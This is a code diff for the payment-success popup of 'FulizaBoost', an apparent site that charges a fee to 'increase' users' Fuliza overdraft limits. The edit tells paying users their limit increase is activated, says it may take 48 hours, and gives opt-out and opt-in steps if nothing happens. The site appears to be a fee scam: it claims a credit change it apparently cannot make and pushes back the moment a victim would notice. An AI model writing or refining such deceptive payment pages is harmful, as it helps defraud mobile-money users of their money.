@@ -1422,72 +1422,73 @@
         const paymentSuccess = await checkPaymentStatus(paymentReference);
         
         if (paymentSuccess) {
-          // Success - MOBILE OPTIMIZED (Updated with styled note)
-          await Swal.fire({
-            title: 'Payment Successful!',
-            html: `
-              <div style="text-align: center; padding: 0 5px;">
-                <div class="success-icon">
-                  <i class="fas fa-check-circle"></i>
-                </div>
-                <p><strong>Your Fuliza limit has been increased!</strong></p>
-                <p style="color: #666; margin-top: 8px;">
-                  New limit: <strong style="color: #1f7a1f;">Ksh ${selectedLoan.amount.toLocaleString()}</strong>
-                </p>
-                
-                <!-- Enhanced note with better styling -->
-                <div style="
-                  background: linear-gradient(135deg, rgba(31, 122, 31, 0.1) 0%, rgba(31, 122, 31, 0.05) 100%);
-                  border-left: 3px solid var(--accent);
-                  padding: 12px;
-                  border-radius: 8px;
-                  margin-top: 15px;
-                  text-align: left;
-                  font-size: 0.8rem;
-                  color: var(--text-dark);
-                  line-height: 1.4;
-                ">
-                  <div style="
-                    display: flex;
-                    align-items: flex-start;
-                    gap: 8px;
-                    margin-bottom: 4px;
-                  ">
-                    <i class="fas fa-exclamation-circle" style="color: var(--accent); font-size: 0.9rem;"></i>
-                    <strong style="color: var(--accent);">Important Note:</strong>
-                  </div>
-                  <div style="padding-left: 22px;">
-                    If your limit does not increase immediately, please:<br>
-                    1. Dial *234# on your phone<br>
-                    2. Select "Opt Out" from Fuliza<br>
-                    3. Wait 2 minutes, then dial *234# again<br>
-                    4. Select "Opt In" to activate your new limit
-                  </div>
-                </div>
-                
-                <p style="color: #666; margin-top: 10px; font-size: 0.8rem;">
-                  Thank you for using FulizaBoost!
-                </p>
-              </div>
-            `,
-            icon: false,
-            confirmButtonText: 'Continue',
-            confirmButtonColor: '#1f7a1f',
-            timer: 10000, // 10 seconds (increased from 4000ms)
-            timerProgressBar: true,
-            customClass: {
-              popup: 'swal2-popup-mobile'
-            }
-          });
-          
-          // Clear storage and reset
-          localStorage.removeItem('fulizaBoostData');
-          resetButton();
-          resetSelections();
-          
-        } else {
-          throw new Error('Payment not confirmed');
-        }
+  // Success - MOBILE OPTIMIZED (Updated with styled note)
+  await Swal.fire({
+    title: 'Payment Successful!',
+    html: `
+      <div style="text-align: center; padding: 0 5px;">
+        <div class="success-icon">
+          <i class="fas fa-check-circle"></i>
+        </div>
+        <p><strong>Your Fuliza limit increase has been activated!</strong></p>
+        <p style="color: #666; margin-top: 8px;">
+          New limit: <strong style="color: var(--primary);">Ksh ${selectedLoan.amount.toLocaleString()}</strong><br>
+          <small>The update may take up to 48 hours to complete</small>
+        </p>
+        
+        <!-- Enhanced note with better styling -->
+        <div style="
+          background: linear-gradient(135deg, rgba(37, 99, 235, 0.1) 0%, rgba(37, 99, 235, 0.05) 100%);
+          border-left: 3px solid var(--accent);
+          padding: 12px;
+          border-radius: 8px;
+          margin-top: 15px;
+          text-align: left;
+          font-size: 0.8rem;
+          color: var(--text-dark);
+          line-height: 1.4;
+        ">
+          <div style="
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 4px;
+          ">
+            <i class="fas fa-exclamation-circle" style="color: var(--accent); font-size: 0.9rem;"></i>
+            <strong style="color: var(--accent);">Important Note:</strong>
+          </div>
+          <div style="padding-left: 22px;">
+            If your limit does not update within 48 hours, please:<br>
+            1. Dial *234# on your phone<br>
+            2. Select "Opt Out" from Fuliza<br>
+            3. Wait 2 minutes, then dial *234# again<br>
+            4. Select "Opt In" to activate your new limit
+          </div>
+        </div>
+        
+        <p style="color: #666; margin-top: 10px; font-size: 0.8rem;">
+          Thank you for using FulizaBoost!
+        </p>
+      </div>
+    `,
+    icon: false,
+    confirmButtonText: 'Continue',
+    confirmButtonColor: 'var(--primary)',
+    timer: 10000,
+    timerProgressBar: true,
+    customClass: {
+      popup: 'swal2-popup-mobile'
+    }
+  });
+  
+  // Clear storage and reset
+  localStorage.removeItem('fulizaBoostData');
+  resetButton();
+  resetSelections();
+  
+} else {
+  throw new Error('Payment not confirmed');
+}
         
       } catch (error) {
         console.error('Payment error:', error);
